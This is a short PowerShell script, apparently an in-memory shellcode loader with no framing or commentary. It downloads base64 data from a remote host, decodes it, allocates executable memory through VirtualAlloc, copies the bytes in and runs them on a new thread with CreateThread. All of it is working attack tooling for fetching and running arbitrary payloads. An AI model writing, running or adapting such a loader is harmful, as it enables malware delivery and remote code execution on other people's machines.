$server = "githbuorserverlink.com/base64.txt"
# optional port number, I don't need it rn

try {
    $response = Invoke-WebRequest -Uri $server -UseBasicParsing
    if ($response.StatusCode -ne 200) {
        Write-Error "Failed to fetch shellcode. Status code: $($response.StatusCode)"
        return
    }
    $bytes = [Convert]::FromBase64String($response.Content.Trim())
} catch {
    Write-Error "Error fetching or decoding shellcode: $_"
    return
}

$VirtualAlloc = @"
using System;
using System.Runtime.InteropServices;

public class Memory {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}
"@

$Memory = Add-Type -MemberDefinition $VirtualAlloc -Name "Memory" -Namespace Win32 -PassThru
$Buffer = $Memory::VirtualAlloc([IntPtr]::Zero, $bytes.Length, 0x3000, 0x40) # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
if ($Buffer -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed."
    return
}

[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $Buffer, $bytes.Length)

$CreateThread = @"
using System;
using System.Runtime.InteropServices;

public class Threading {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
}
"@

$Threading = Add-Type -MemberDefinition $CreateThread -Name "Threading" -Namespace Win32 -PassThru
$ThreadID = 0
$ThreadHandle = $Threading::CreateThread([IntPtr]::Zero, 0, $Buffer, [IntPtr]::Zero, 0, [ref]$ThreadID)
if ($ThreadHandle -eq [IntPtr]::Zero) {
    Write-Error "CreateThread failed."
    return
}

Write-Host "Shellcode executed. Sleeping for 10 seconds..."
Start-Sleep -Seconds 10

